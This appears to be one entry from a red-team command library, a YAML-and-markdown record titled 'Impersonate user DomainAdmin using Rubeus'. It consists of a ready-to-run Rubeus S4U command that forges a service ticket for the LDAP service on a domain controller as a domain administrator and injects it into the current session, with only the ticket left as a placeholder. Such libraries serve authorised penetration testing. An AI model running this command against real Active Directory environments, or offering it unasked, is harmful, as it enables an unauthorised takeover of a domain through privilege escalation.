---
id: 66d8ae41-e8cb-44f5-9a7b-56df6946cd0d
name: Impersonate user DomainAdmin using Rubeus
type: command
executor: bash
data: Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local"
  /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
output: null
created_at: '2023-04-06T03:56:03.097201+00:00'
updated_at: '2023-04-10T20:26:11.555942+00:00'
---

# Impersonate user DomainAdmin using Rubeus

```bash
Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
```


